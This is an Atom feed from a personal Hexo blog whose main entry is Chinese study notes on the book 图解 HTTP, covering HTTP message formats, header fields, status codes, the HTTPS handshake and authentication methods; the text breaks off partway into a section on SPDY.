<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Senyu&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://xsenyu.github.io/"/>
  <updated>2020-04-06T13:02:17.781Z</updated>
  <id>http://xsenyu.github.io/</id>
  
  <author>
    <name>senyu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>知识点记录</title>
    <link href="http://xsenyu.github.io/2020/04/06/%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/"/>
    <id>http://xsenyu.github.io/2020/04/06/%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/</id>
    <published>2020-04-06T13:02:17.000Z</published>
    <updated>2020-04-06T13:02:17.781Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>《图解 HTTP》知识点整理</title>
    <link href="http://xsenyu.github.io/2019/11/21/%E5%9B%BE%E8%A7%A3%20HTTP%20%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/"/>
    <id>http://xsenyu.github.io/2019/11/21/%E5%9B%BE%E8%A7%A3%20HTTP%20%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/</id>
    <published>2019-11-21T12:50:00.000Z</published>
    <updated>2020-04-06T13:03:14.110Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/.io//Storyboard.png" alt="aaa"></p><h3 id="Web-和网络基础"><a href="#Web-和网络基础" class="headerlink" title="Web 和网络基础"></a>Web 和网络基础</h3><ol><li><p>绝对 URI 的格式。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://user:pass@www.example.com:80/dir/index.html?uid=1#ch1</span><br></pre></td></tr></table></figure><ul><li><code>http://</code>：协议方案名</li><li><code>user:pass</code>：登录信息（认证）</li><li><code>www.example.com</code>：服务器地址</li><li><code>80</code>：端口号</li><li><code>/dir/index.html</code>：带层次的文件路径，也就是请求 URI</li><li><code>uid=1</code>：查询字符串</li><li><code>ch1</code>：片段标识符</li></ul></li></ol><h3 id="HTTP-协议"><a href="#HTTP-协议" class="headerlink" title="HTTP 协议"></a>HTTP 协议</h3><ol><li><p>请求报文的构成：<br>请求行分别为 方法、URI、协议版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;form&#x2F;entry HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure><p>接下来是请求首部字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host: hackr.jp</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 16</span><br></pre></td></tr></table></figure><p>空一行分隔（CR+LF），内容实体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;ueno&amp;age&#x3D;37</span><br></pre></td></tr></table></figure></li><li><p>响应报文的构成：<br>状态行分别为 协议版本、状态码、状态码的原因短语</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br></pre></td></tr></table></figure><p>接下来是响应首部字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Date: Tue, 10 Jul 2012 06:50:15 GMT</span><br><span class="line">Content-Length: 362</span><br><span class="line">Content-Type: text&#x2F;html</span><br></pre></td></tr></table></figure><p>空一行分隔（CR+LF），然后是内容主体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>HTTP/1.1 中可使用的方法</p><ol><li><strong>GET</strong> : 获取资源。</li><li><strong>POST</strong> : 传输实体主体。</li><li><strong>PUT</strong> : 传输文件。不带检验机制。</li><li><strong>HEAD</strong> : 获得报文首部。和 GET 一样，只是不返回主体，用于确认 URI 的有效性及资源更新的日期时间等</li><li><strong>DELETE</strong> : 删除文件。与 PUT 相反。</li><li><strong>OPTIONS</strong> : 询问支持的 HTTP 方法。</li><li><strong>TRACE</strong> : 追踪路径，让 Web 服务器将之前的请求通信环回给客户端。</li><li><strong>CONNECT</strong> : 要求用隧道协议连接代理。使用 SSL 和 TLS 协议加密通信内容后传输。</li></ol><p>另外 <strong>LINK</strong> 和 <strong>UNLINK</strong> 方法在 HTTP/1.1 被废弃。</p></li><li><p>HTTP /1.1 首部字段（47 种）一览：</p><ol><li><p>通用首部字段</p><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody><tr><td>Cache-Control</td><td>控制缓存的行为</td></tr><tr><td>Connection</td><td>逐跳首部、连接的管理</td></tr><tr><td>Date</td><td>创建报文的日期时间</td></tr><tr><td>Pragma</td><td>报文指令</td></tr><tr><td>Trailer</td><td>报文末端的首部一览</td></tr><tr><td>Transfer-Encoding</td><td>指定报文主体的传输编码方式</td></tr><tr><td>Upgrade</td><td>升级为其他协议</td></tr><tr><td>Via</td><td>代理服务器的相关信息</td></tr><tr><td>Warning</td><td>错误通知</td></tr></tbody></table></li><li><p>请求首部字段</p><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody><tr><td>Accept</td><td>用户代理可处理的媒体类型</td></tr><tr><td>Accept-Charset</td><td>优先的字符集</td></tr><tr><td>Accept-Encoding</td><td>优先的内容编码</td></tr><tr><td>Accept-Language</td><td>优先的语言（自然语言）</td></tr><tr><td>Authorization</td><td>Web 认证信息</td></tr><tr><td>Expect</td><td>期待服务器的特定行为</td></tr><tr><td>From</td><td>用户的电子邮箱地址</td></tr><tr><td>Host</td><td>请求资源所在的服务器</td></tr><tr><td>If-Match</td><td>比较实体标记（ETag）</td></tr><tr><td>If-Modified-Since</td><td>比较资源的更新时间</td></tr><tr><td>If-Range</td><td>资源未更新时发送实体 Byte 的范围请求</td></tr><tr><td>If-Unmodified-Since</td><td>比较资源的更新时间（与 If-Modified-Since 相反）</td></tr><tr><td>Max-Forwards</td><td>最大传输逐跳数</td></tr><tr><td>Proxy-Authorization</td><td>代理服务器要求客户端的认证信息</td></tr><tr><td>Range</td><td>实体的字节请求范围</td></tr><tr><td>Referer</td><td>对请求中 URI 的原始获取方</td></tr><tr><td>TE</td><td>传输编码的优先级</td></tr><tr><td>User-Agent</td><td>HTTP 客户端程序的信息</td></tr></tbody></table></li><li><p>响应首部字段</p><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody><tr><td>Accept-Ranges</td><td>是否可接受字节的范围请求</td></tr><tr><td>Age</td><td>推算资源创建经过的时间</td></tr><tr><td>ETag</td><td>资源的匹配信息</td></tr><tr><td>Location</td><td>令客户端重定向至指定 URI</td></tr><tr><td>Proxy-Authenticate</td><td>代理服务器对客户端的认证信息</td></tr><tr><td>Retry-After</td><td>对再次发起请求的时机要求</td></tr><tr><td>Server</td><td>HTTP 服务器的安装信息</td></tr><tr><td>Vary</td><td>代理服务器缓存的管理信息</td></tr><tr><td>WWW-Authenticate</td><td>服务器对客户端的认证信息</td></tr></tbody></table></li><li><p>实体首部字段</p><table><thead><tr><th>首部字段名</th><th>说明</th></tr></thead><tbody><tr><td>Allow</td><td>资源可支持的 HTTP 方法</td></tr><tr><td>Content-Encoding</td><td>实体主体使用的编码方式</td></tr><tr><td>Content-Language</td><td>实体主体的自然语言</td></tr><tr><td>Content-Length</td><td>实体主体的大小</td></tr><tr><td>Content-Location</td><td>替代对应的资源的 URI</td></tr><tr><td>Content-MD5</td><td>实体主体的报文摘要</td></tr><tr><td>Content-Range</td><td>实体主体的位置范围</td></tr><tr><td>Expires</td><td>实体主体过期的日期时间</td></tr><tr><td>Last-Modified</td><td>资源的最后修改日期时间</td></tr></tbody></table></li></ol><h5 id="注：还有其他-RFC-2616-外定义的首部字段，如-Cookie，Set-Cookie-和-Content-Disposition-等也是会经常用到。"><a href="#注：还有其他-RFC-2616-外定义的首部字段，如-Cookie，Set-Cookie-和-Content-Disposition-等也是会经常用到。" class="headerlink" title="注：还有其他 RFC 2616 外定义的首部字段，如 Cookie，Set-Cookie 和 Content-Disposition 等也是会经常用到。"></a>注：还有其他 RFC 2616 外定义的首部字段，如 Cookie，Set-Cookie 和 Content-Disposition 等也是会经常用到。</h5></li><li><p>End-to-end 首部和 Hop-by-hop 首部（是否缓存代理）</p><p>除以下 8 个首部字段之外，其他所有字段都属于端到端首部</p><ul><li><strong>Connection</strong></li><li><strong>Keep-Alive</strong></li><li><strong>Proxy-Authenticate</strong></li><li><strong>Proxy-Authorization</strong></li><li><strong>Trailer</strong></li><li><strong>TE</strong></li><li><strong>Transfer-Encoding</strong></li><li><strong>Upgrade</strong></li></ul></li></ol><h3 id="HTTP-1-1-通用首部字段详解"><a href="#HTTP-1-1-通用首部字段详解" class="headerlink" title="HTTP /1.1 通用首部字段详解"></a>HTTP /1.1 通用首部字段详解</h3><ol><li><p><strong>Cache-Control</strong> 控制缓存的行为，指令的参数是可选的，通过“,”分隔。</p><ul><li><p>缓存请求指令</p><table><thead><tr><th>指令</th><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>no-cache</td><td>无</td><td>强制向源服务器再次验证</td></tr><tr><td>no-store</td><td>无</td><td>不缓存请求或响应的任何内容</td></tr><tr><td>max-age=[秒]</td><td>必需</td><td>响应的最大Age值</td></tr><tr><td>max-stale(=[秒])</td><td>可省略</td><td>接收已过期的响应</td></tr><tr><td>min-fresh=[秒]</td><td>必需</td><td>期望在指定时间内的响应仍有效</td></tr><tr><td>no-transform</td><td>无</td><td>代理不可更改媒体类型</td></tr><tr><td>only-if-cached</td><td>无</td><td>从缓存获取资源</td></tr><tr><td>cache-extension</td><td>-</td><td>新指令标记（token）</td></tr></tbody></table></li><li><p>缓存响应指令</p><table><thead><tr><th>指令</th><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>public</td><td>无</td><td>可向任意方提供响应的缓存</td></tr><tr><td>private</td><td>可省略</td><td>仅向特定用户返回响应</td></tr><tr><td>no-cache</td><td>可省略</td><td>缓存前必须先确认其有效性</td></tr><tr><td>no-store</td><td>无</td><td>不缓存请求或响应的任何内容</td></tr><tr><td>no-transform</td><td>无</td><td>代理不可更改的媒体类型</td></tr><tr><td>must-revalidate</td><td>无</td><td>可缓存但必须再向源服务器进行确认</td></tr><tr><td>proxy-revalidate</td><td>无</td><td>要求中间缓存服务器对缓存的响应有效性再进行确认</td></tr><tr><td>max-age = [秒]</td><td>必需</td><td>响应的最大Age值</td></tr><tr><td>s-maxage = [秒]</td><td>必需</td><td>公共缓存服务器响应的最大Age值</td></tr><tr><td>cache-extension</td><td>-</td><td>新指令标记（token）</td></tr></tbody></table></li></ul></li><li><p><strong>Connection</strong> 具备两个作用：</p><ul><li><p>控制不再转发给代理的首部字段</p></li><li><p>管理持久连接：</p><p>HTTP /1.1 版本的默认连接都是持久连接（Keep-Alive），当服务端想明确断开连接时，指定其值为 Close。</p></li></ul></li><li><p><strong>Pragma</strong> 是 HTTP/1.1 之前版本的历史遗留字段，仅作为与 HTTP/1.0 的向后兼容而定义。只用在客户端发送请求，要求所有的中间服务器不返回缓存的资源。形式唯一：<code>Pragma: no-cache</code></p></li><li><p><strong>Trailer</strong> 会实现说明在报文主体后记录了哪些首部字段，可应用在 HTTP/1.1 版本分块传输编码时。</p></li><li><p><strong>Transfer-Encoding</strong> 规定了传输报文主体时采用的编码方式。</p></li><li><p><strong>Upgrade</strong> 用于检测 HTTP 协议及其他协议是否可使用更高的版本进行通信，仅限于客户端和邻接服务器之间。因此，使用首部字段 Upgrade 时，还需要额外指定 Connection:Upgrade。</p></li><li><p><strong>Via</strong> 是为了追踪客户端和服务器之间的请求和响应报文的传输路径，配合 TRACE 方法使用。</p></li><li><p><strong>Warning</strong> 会告知用户一些与缓存相关的问题和警告，格式如下：</p><p><code>Warning: [警告码][警告的主机:端口号]&quot;[警告内容]&quot;([日期时间])</code></p><p>HTTP /1.1 定义了 7 种警告码：</p><table><thead><tr><th align="center">警告码</th><th>警告内容</th><th>说明</th></tr></thead><tbody><tr><td align="center">110</td><td>Response is stale (响应已过期)</td><td>代理返回已过期的资源</td></tr><tr><td align="center">111</td><td>Revalidation failed (再验证失败)</td><td>代理再验证资源有效性时失败(服务 器无法到达等原因)</td></tr><tr><td align="center">112</td><td>Disconnection operation(断开连接操作)</td><td>代理与互联网连接被故意切断</td></tr><tr><td align="center">113</td><td>Heuristic expiration (试探性过期)</td><td>响应的使用期超过24小时(有效缓存 的设定时间大于24小时的情况下)</td></tr><tr><td align="center">199</td><td>Miscellaneous warning (杂项警告)</td><td>任意的警告内容</td></tr><tr><td align="center">214</td><td>Transformation applied (使用了转换)</td><td>代理对内容编码或媒体类型等执行了 某些处理时</td></tr><tr><td align="center">299</td><td>Miscellaneous persistent warning(持久杂项警告)</td><td>任意的警告内容</td></tr></tbody></table></li></ol><h3 id="HTTP-1-1-请求首部字段详解"><a href="#HTTP-1-1-请求首部字段详解" class="headerlink" title="HTTP /1.1 请求首部字段详解"></a>HTTP /1.1 请求首部字段详解</h3><ol><li><p><strong>Accept</strong> 通知服务器用户代理能够处理的媒体类型及媒体类型的相对优先级。例如：</p><ul><li><p>文本文件</p><p>text/html, text/plain, text/css … </p><p>application/xhtml+xml, application/xml … </p></li><li><p>图片文件<br> image/jpeg, image/gif, image/png … </p></li><li><p>视频文件</p><p>video/mpeg, video/quicktime …</p></li><li><p>应用程序使用的二进制文件</p><p>application/octet-stream, application/zip …</p></li></ul><p>若想要给显示的媒体类型增加优先级，则使用 <code>q=</code> 来额外表示权重值，用”;”进行分隔，范围0~1，可精确到小数点后3位，1为最大值和默认值。</p></li><li><p><strong>Accept-Charset</strong> 通知服务器用户代理支持的字符集及其优先顺序。</p></li><li><p><strong>Accept-Encoding</strong> 告知服务器用户代理支持的内容编码及优先级顺序，常用编码有：</p><ul><li>gzip（GNU zip）</li><li>compress（UNIX 系统的标准压缩）</li><li>deflate（zlib）</li><li>Identity（不进行编码）</li></ul><p>权重也是采用 q 值表示优先级。也可以使用“*”作为通配符。</p></li><li><p><strong>Accept-Language</strong> 告知服务器用户代理能够处理的自然语言集。</p></li><li><p><strong>Authorization</strong> 用来告知服务器用户代理的认证信息。通常是在返回 401 状态码响应后，把首部字段 Authorization 加入请求中。</p></li><li><p><strong>Expect</strong> 客户端用来告知服务器期望出现的某种特定行为。服务器无理解客户端的期望而发生错误时，会返回 417 Expectation Failed。</p></li><li><p><strong>From</strong> 用来告知服务器使用用户代理的电子邮件地址，目的是为了显示搜索引擎等用户代理的负责人的电子邮件联系方式。</p></li><li><p><strong>Host</strong> 会告知服务器请求的资源所处的互联网主机名和端口号，是 HTTP /1.1 规范内唯一一个必须被包含在请求内的首部字段。</p></li><li><p><strong>If-Match</strong> 条件请求，指定条件为真时，才会执行请求。</p></li><li><p><strong>If-Modified-Since</strong> 如果在指定的日期时间后，资源发生了更新，服务器就会接受请求。</p></li><li><p><strong>If-None-Match</strong> 和 If-Match 作用相反。</p></li><li><p><strong>If-Range</strong> 若指定的字段值和请求资源的一致时，则作为范围请求处理。相当于 If-Match 和 Range 两次处理</p></li><li><p><strong>If-Unmodified-Since</strong> 和 If-Modified-Since 的作用相反。</p></li><li><p><strong>Max-Forwards</strong> 通过 TRACE 和 OPTIONS 方法，表示以十进制证书形式指定可经过的服务器最大数目，在往下一个服务器转发请求前会减 1 后重新赋值。</p></li><li><p><strong>Proxy-Authorization</strong> 告知服务器认证所需要的信息。</p></li><li><p><strong>Range</strong> 告知服务器资源的指定范围。</p></li><li><p><strong>Referer</strong> 告知服务器请求的原始资源的 URI。</p></li><li><p><strong>TE</strong> 告知服务器能够处理响应的传输编码方式及其优先级。与 Accept-Encoding 的功能很像，但是用于传输编码。</p></li><li><p><strong>User-Agent</strong> 会将创建请求的浏览器和用户代理名称等信息传达给服务器。</p></li></ol><h3 id="响应首部字段"><a href="#响应首部字段" class="headerlink" title="响应首部字段"></a>响应首部字段</h3><ol><li><strong>Accept-Ranges</strong> 用来告知客户端服务器是否能处理范围请求。可处理时指定其为 bytes，反之为 none。</li><li><strong>Age</strong> 告知客户端源服务器在多久前创建了响应。字段值的单位为秒。</li><li><strong>ETag</strong> 能告知客户端实体标示。是一种可将资源以字符串形式做唯一性标识的方式。没有统一的算法规则，仅仅由服务器来分配。ETag 中有强 ETag 值和弱 ETag 值之分，强 ETag 值不论实体发生多么细微的变化都会改变其值；弱 ETag 值只用于提示资源是否相同，只有资源发生根本变化才会改变。弱 ETag 会在字符值最开始处附加 W/。</li><li><strong>Location</strong> 可以将响应接收方引导至某个与请求 URI 位置不同的资源，通常会配合 3xx 的响应。</li><li><strong>Proxy-Authenticate</strong> 会把由代理服务器所要求的认证信息发送给客户端。</li><li><strong>Retry-After</strong> 告知客户端应该在多久之后再次发送请求。主要配合 503 Service Unavailable 或 3xx 响应。</li><li><strong>Server</strong> 告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。</li><li><strong>Vary</strong> 可对缓存进行控制，源服务器会向代理服务器传达关于本地缓存使用方法的命令。</li><li><strong>WWW-Authenticate</strong> 用于 HTTP 访问认证。会告知客户端适用于访问请求 URI 所指定资源的认证方案（Basic 或 Digest） 和带参数提示的质询（Challenge）。</li></ol><h3 id="实体首部字段"><a href="#实体首部字段" class="headerlink" title="实体首部字段"></a>实体首部字段</h3><ol><li><strong>Allow</strong> 用于通知客户端能够支持的 Request-URI 指定资源的所有 HTTP 方法。当接收到不支持的 HTTP 方法时，会以状态码 405 Method Not Allowed 作为响应返回。</li><li><strong>Content-Encoding</strong> 会告知客户端服务器对实体的主体部分选用的内容编码方式。</li><li><strong>Content-Language</strong> 会告知客户端实体主体使用的自然语言。</li><li><strong>Content-Length</strong> 表明了实体主体部分的大小。对实体主体进行内容编码传输时，不能再使用。</li><li><strong>Content-Location</strong> 给出与报文主体部分相对应的 URI。</li><li><strong>Content-MD5</strong>  客户端会对接收的报文主体执行相同的 MD5 算法，然后与此字段值比较。对报文主体执行 MD5 算法获得的 128 位二进制数（32个字符），再通过 Base64 编码的借口就是此字段值。</li><li><strong>Content-Range</strong> 针对范围请求，告知客户端作为响应返回的实体和那个部分符合范围请求，单位字节。</li><li><strong>Content-Type</strong> 说明了实体主体内对象的媒体类型。</li><li><strong>Expires</strong> 会将资源失效的日期告知客户端。当首部的 Cache-Control 有 max-age 指令时会优先处理。</li><li><strong>Last-Modified</strong> 指明资源最终修改的时间。</li></ol><h3 id="为-Cookie-服务的字段"><a href="#为-Cookie-服务的字段" class="headerlink" title="为 Cookie 服务的字段"></a>为 Cookie 服务的字段</h3><ol><li><p><strong>Set-Cookie</strong> 开始管理客户端的状态时，会事先告知使用的 Cookie 信息。</p><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>NAME=VALUE</td><td>赋予 Cookie 的名称和其值（必需项）</td></tr><tr><td>expires=DATE</td><td>Cookie 的有效期（若不指明则默认为浏览器关闭前为止）</td></tr><tr><td>path=PATH</td><td>将服务器上的文件目录作为 Cookie 的使用对象（若不指定则默认为文档所在的文件目录）</td></tr><tr><td>domain=域名</td><td>作为 Cookie 使用对象的域名（若不指定则默认为创建 Cookie 的服务器的域名）</td></tr><tr><td>Secure</td><td>仅在 HTTPS 安全通信时才会发送 Cookie</td></tr><tr><td>HttpOnly</td><td>加以限制，使 Cookie 不能被 JavaScript 脚本访问</td></tr></tbody></table></li><li><p><strong>Cookie</strong> 会告知服务器，当客户端想获得 HTTP 状态管理支持时，就会在请求中包含从服务器接收到的 Cookie。</p></li></ol><h3 id="其他字段"><a href="#其他字段" class="headerlink" title="其他字段"></a>其他字段</h3><ol><li><p><strong>X-Frame-Options</strong> 属于 HTTP 响应首部，控制网站内容在其他 Web 网站的 Frame 标签内的显示问题。主要目的是为了防止点击劫持攻击。有以下两个可指定的字段值。</p><ul><li><p><strong>DENY</strong>：拒绝</p></li><li><p><strong>SAMEORIGIN</strong>：仅同源域名下的页面匹配时许可。</p></li></ul></li><li><p><strong>X-XSS-Protection</strong> 属于 HTTP 响应首部，针对跨站脚本攻击的一种对策，用于控制浏览器 XSS 防护机制的开关。可指定的值：</p><ul><li><p><strong>0</strong> ：将 XSS 过滤设置成无效状态</p></li><li><p><strong>1</strong> ：将 XSS 过滤设置成有效状态</p></li></ul></li><li><p><strong>DNT</strong> 属于 HTTP 请求首部，为 Do Not Track 的简称，意为拒绝个人信息被收集，是标示拒绝被精准广告追踪的一种方法。可指定的值：</p><ul><li><p><strong>0</strong> ：同意被追踪</p></li><li><p><strong>1</strong> ：拒绝被追踪</p></li></ul></li><li><p><strong>P3P</strong> 属于 HTTP 响应首部，通过利用 P3P (The Platform for Privacy Preferences，在线隐私偏好平台) 技术，可以让 Web 网站上的个人隐私变成一种仅供程序可理解的形式，以达到保护用户隐私的目的。需按以下操作步骤：</p><p>步骤 <strong>1</strong>：创建 P3P 隐私</p><p>步骤 <strong>2</strong>：创建 P3P 隐私对照文件后，保存命名在 /w3c/p3p.xml</p><p>步骤 <strong>3</strong>：从 P3P 隐私中新建 Compact policies 后，输出到 HTTP 响应 中</p></li></ol><h3 id="HTTP-状态"><a href="#HTTP-状态" class="headerlink" title="HTTP 状态"></a>HTTP 状态</h3><ol><li>状态码的类型：</li></ol><table><thead><tr><th></th><th>类别</th><th>原因短语</th></tr></thead><tbody><tr><td>1XX</td><td>Informational（信息性状态码）</td><td>接收的请求正在处理</td></tr><tr><td>2XX</td><td>Success（成功状态码）</td><td>请求正常处理完毕</td></tr><tr><td>3XX</td><td>Redirection（重定向状态码）</td><td>需要进行附加操作以完成请求</td></tr><tr><td>4XX</td><td>Client Error（客户端错误状态码）</td><td>服务器无法处理请求</td></tr><tr><td>5XX</td><td>Server Error（服务器错误状态码）</td><td>服务器处理请求出错</td></tr></tbody></table><ol start="2"><li><p><strong>2XX</strong> 成功</p><ol><li><strong>200 OK</strong>：正常处理</li><li><strong>204 No Content</strong>：已成功处理，但返回的响应报文中不含实体的主体部分。</li><li><strong>206 Partial Content</strong> ：服务器成功执行了范围请求。</li></ol></li><li><p><strong>3XX</strong> 重定向</p><ol><li><strong>301 Moved Permanently</strong>：永久性重定向</li><li><strong>302 Found</strong>：临时性重定向，POST 会变成 GET</li><li><strong>303 See Other</strong>：表示资源存在着另一个 URI，并希望客户端使用 GET 方式定向获取资源</li><li><strong>304 Not Modified</strong>：客户端发送附带条件的请求，服务器端允许请求访问资源但未满足条件</li><li><strong>307 Temporary Redirect</strong>：临时重定向，不会把 POST 变换成 GET</li></ol><h5 id="注：HTTP-1-1-中使用-303-和-307-来细化-302-重定向的行为。"><a href="#注：HTTP-1-1-中使用-303-和-307-来细化-302-重定向的行为。" class="headerlink" title="注：HTTP 1.1 中使用 303 和 307 来细化 302 重定向的行为。"></a>注：HTTP 1.1 中使用 303 和 307 来细化 302 重定向的行为。</h5></li><li><p><strong>4XX</strong> 客户端错误</p><ol><li><strong>400 Bad Request</strong>：请求报文中存在语法错误</li><li><strong>401 Unauthorized</strong>：表示发送请求需要有通过 HTTP 认证（浏览器弹窗输入密码）</li><li><strong>403 Forbidden</strong>：请求资源的访问被服务器拒绝了</li><li><strong>404 Not Found</strong>：服务器上无法找到请求的资源（或者拒绝请求且不想说明原因）</li></ol></li><li><p><strong>5XX</strong> 服务器错误</p><ol><li><strong>500 Internal Server Error</strong>：服务端在执行请求时发生错误</li><li><strong>503 Service Unavailable</strong>：服务器暂时处于超负荷或正在进行停机维，无法处理请求</li></ol></li></ol><h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><ol><li><p>HTTP 的缺点：</p><ul><li>通信使用明文（不加密），内容可能会被窃听。（内容泄漏）</li><li>不验证通信方的身份，因此有可能遭遇伪装。（Dos 攻击）</li><li>无法验证报文的完整性，所以有可能已遭篡改。（MITM 攻击）</li></ul><p>即：HTTP + 加密 + 认证 + 完整性保护 = HTTPS</p></li><li><p>SSL</p><ul><li>SSL 是独立于 HTTP 的协议，使用 SSL 时，先和 SSL 通信，再由 SSL 和 TCP 通信。</li><li>SSL 采用公开密钥加密的非对称加密处理方式，发送方使用公钥进行加密，接收方使用私钥进行解密。</li><li>EV SSL 证书可确认对方服务器背后运营的企业是否真实存在。</li><li>使用 OpenSSL 的开源程序，可以构建一套属于自己的认证机构，给自己的服务器颁发证书。浏览器访问时，会显示无法确认连接安全性等警告消息。</li><li>HTTPS 比 HTTP 慢 2 到 100 倍，SSL 的慢一种是通信慢，另一种是指由于大量消耗 CPU 等资源导致处理速度变慢。</li></ul></li><li><p>HTTPS 工作流程</p><ol><li>客户端通过发送 <code>Client Hello</code> 报文开始 SSL 通信。报文中包 含客户端支持的 SSL 的指定版本、加密组件（Cipher Suite）列表（所使用的加密算法及密钥长度等）。</li><li>服务器可进行 SSL 通信时，会以 <code>Server Hello</code> 报文作为应答。</li><li>之后服务器发送 <code>Certificate</code> 报文。报文中包含公开密钥证书。</li><li>服务器发送 <code>Server Hello Done</code> 报文通知客户端，最初阶段的 SSL 握手协商部分结束。</li><li>SSL 第一次握手结束之后，客户端以 <code>Client Key Exchange</code> 报文作为回应。报文中包含通信加密中使用的一种被称为 <code>Pre-master secret</code> 的随机密码串。该报文已用步骤 3 中的公开密钥进行加密。</li><li>接着客户端继续发送 <code>Change Cipher Spec</code> 报文。</li><li>客户端发送 <code>Finished</code> 报文。该报文包含连接至今全部报文的整体校验值。</li><li>服务器同样发送 <code>Change Cipher Spec</code> 报文。</li><li>服务器同样发送 <code>Finished</code> 报文。</li><li>服务器和客户端的 <code>Finished</code> 报文交换完毕之后，SSL 连接就算建立完成。</li><li>应用层协议通信，即发送 HTTP 响应。</li><li>最后由客户端断开连接。断开连接时，发送 <code>close_notify</code> 报文。</li></ol><p>在以上流程中，应用层发送数据时会附加一种叫做 MAC(Message Authentication Code)的报文摘要。MAC 能够查知报文是否遭到篡 改，从而保护报文的完整性。</p></li></ol><h3 id="HTTP-1-1-使用的认证方式"><a href="#HTTP-1-1-使用的认证方式" class="headerlink" title="HTTP/1.1 使用的认证方式"></a>HTTP/1.1 使用的认证方式</h3><ul><li><p>BASIC 认证（基本认证）：</p><ol><li>当请求的资源需要认证时，服务器会随状态码 <strong>401 Authorization Required</strong>，返回带 <strong>WWW-Authenticate</strong> 首部字段的响应。该字段内包含认证的方式（BASIC） 及 Request-URI 安全域字符串 (realm)。</li><li>接收到状态码 401 的客户端为了通过 BASIC 认证，需要将用户信息发送给服务器，信息中间以冒号(:)连接后，再经过 Base64 编码处理。</li><li>接收到包含首部字段 <strong>Authorization</strong> 请求的服务器，会对认证信息的正确性进行验证。如验证通过，则返回一条包含 Request-URI 资源的响应。</li></ol><p>BASIC 认证虽然采用 Base64 编码方式，但这不是加密处理，不需要任何附加信息即可对其解码。如果被人窃听，被盗的可能性极高。</p></li><li><p>DIGEST 认证（摘要认证）：</p><ol><li>和 BASIC 认证一样，<strong>WWW-Authenticate</strong> 字段内包含质问响应方式认证所需的临时质询码（随机数， nonce）和 realm。</li><li>接收到 401 状态码的客户端，返回的响应中包含 DIGEST 认证必须的首部字段 Authorization 信息。必须包含 username、realm、nonce、uri 和 response 的字段信息。</li><li>接收到包含首部字段 <strong>Authorization</strong> 请求的服务器，会对认证信息的正确性进行验证。如验证通过，则返回一条包含 Request-URI 资源的响应。并且这时会在首部字段 <strong>Authentication-Info</strong> 写入一些认证成功的相关信息。</li></ol></li><li><p>SSL 客户端认证</p><ol><li>接收到需要认证资源的请求，服务器会发送 <code>Certificate Request</code> 报文，要求客户端提供客户端证书。</li><li>用户选择将发送的客户端证书后，客户端会把客户端证书信息以 <code>Client Certificate</code> 报文方式发送给服务器。</li><li>服务器验证客户端证书验证通过后方可领取证书内客户端的公开密钥，然后开始 HTTPS 加密通信。</li></ol></li><li><p>FormBase 认证（基于表单认证）</p><p>基于表单的认证方法并不是在 HTTP 协议中定义的，客户端会向服务器上的 Web 应用程序发送登录信息(Credential)，按登录信息的验证结果认证。（也就是常见的输入账号密码登录）</p><p>基于表单认证的标准规范尚未有定论，一般会使用 Cookie 来管理 Session（会话），以弥补 HTTP 协议中不存在的状态管理功能。具体流程如下：</p><ol><li>客户端把用户 ID 和密码等登录信息放入报文的实体部分， 通常是以 POST 方法把请求发送给服务器。而这时，会使用 HTTPS 通信来进行 HTML 表单画面的显示和用户输入数据的发送。</li><li>服务器会发放用以识别用户的 Session ID，并通过首部字段 <strong>Set-Cookie</strong> 告知客户端写入 Cookie。</li><li>客户端在下次向服务器发送请求时会自动带上 Cookie 中的 Session ID，服务器端可通过验证接收到的 Session ID 识别用户和其认证状态。</li></ol></li></ul><h3 id="HTTP-的功能追加协议"><a href="#HTTP-的功能追加协议" class="headerlink" title="HTTP 的功能追加协议"></a>HTTP 的功能追加协议</h3><ol><li><p><strong>SPDY</strong></p><ul><li>频繁的进行 HTTP 请求会有以下瓶颈：<ul><li>一条连接上只可发送一个请求。</li><li>请求只能从客户端开始。客户端不可以接收除响应以外的指令。</li><li>请求 <strong>/</strong> 响应首部未经压缩就发送。首部信息越多延迟越大。</li><li>发送冗长的首部。每次互相发送相同的首部造成的浪费较多。</li><li>可任意选择数据压缩格式。非强制压缩发送。</li></ul></li><li>基于 HTTP 